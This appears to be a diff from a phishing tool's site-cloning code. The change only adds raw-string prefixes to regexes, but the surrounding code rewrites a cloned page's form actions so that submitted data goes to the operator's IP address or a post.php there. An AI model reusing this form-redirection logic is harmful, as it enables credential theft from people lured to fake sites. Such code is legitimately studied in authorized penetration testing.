@@ -76,13 +76,13 @@ for line in fileopen:
         # web server running to post the data to your site
         if ssl_flag == 'false':
             line = re.sub(
-                'action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
+                r'action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
             if apache_mode == "on":
                 line = re.sub(
                     'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
         if ssl_flag == 'true':
             line = re.sub(
-                'action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
+                r'action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
             if apache_mode == "on":
                 line = re.sub(
                     'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
